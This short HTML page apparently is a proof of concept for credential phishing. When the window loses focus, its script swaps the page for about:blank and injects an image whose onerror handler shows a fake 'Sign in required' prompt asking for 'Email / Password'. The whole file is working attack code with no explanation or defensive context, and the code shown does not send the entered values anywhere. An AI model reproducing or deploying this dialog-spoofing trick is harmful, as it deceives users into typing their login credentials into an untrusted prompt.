<!DOCTYPE html>
<html>
<head>
    <title>Prompt Example</title>
</head>
<body>
    <script>
        onblur = () => {
            // Menggunakan pendekatan innerHTML dengan onerror
            let w = open('about:blank', '_self');
            w.document.body.innerHTML = '<img src="" onerror="setTimeout(function() { prompt(\"Sign in required\", \"Email / Password\") }, 100)">';
        }    
        window.open("about:blank", "_self");
    </script>
</body>
</html>
